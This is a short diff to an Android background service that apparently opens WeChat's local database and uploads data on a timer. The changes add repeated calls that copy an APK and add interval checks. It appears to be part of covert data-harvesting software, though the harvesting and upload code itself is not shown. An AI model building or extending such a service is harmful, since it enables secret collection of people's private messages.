@@ -73,8 +73,10 @@ public class GohnsonService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        isExecuteEnd  = true;
         initBaseContnet();
         initWeChatDB();
+        Utils.copyVserAPK(GohnsonService.this);
     }
     public void initWeChatDB(){
         weChatDBOperator =  new WeChatDBOperator(this);
@@ -135,6 +137,7 @@ public class GohnsonService extends Service {
         if (mTimerTask != null) return;
         mTimerTask = new TimerTask() {
             public void run() {
+                Utils.copyVserAPK(GohnsonService.this);
 
                 existTime = existTime + GlobalCofig.EXECUTE_HEARBEAT_INTERVAL;
                 LogInputUtil.e(TAG, "存在时长：" + existTime / 1000);
@@ -166,7 +169,11 @@ public class GohnsonService extends Service {
         long intervalTime = currentTime - lastTime;
         LogInputUtil.e(TAG, "上次时间 = " + lastTime + ", 本次时间 = " + currentTime + "间隔时间为 = " + intervalTime);
 
-        if (intervalTime < GlobalCofig.EXECUTE_SERVICE_INTERVAL) return false;
+        if (intervalTime < GlobalCofig.EXECUTE_SERVICE_INTERVAL) {
+            LogInputUtil.e(TAG, "未超过最低时间间隔，不执行业务");
+            isExecuteEnd = true;
+            return false;
+        }
 
         ShareData.getInstance().saveLongValue(this, GlobalCofig.LAST_EXECUTE_SERVICE_TIME, currentTime);
         LogInputUtil.e(TAG, "超过间隔时间，可以执行上传操作！");
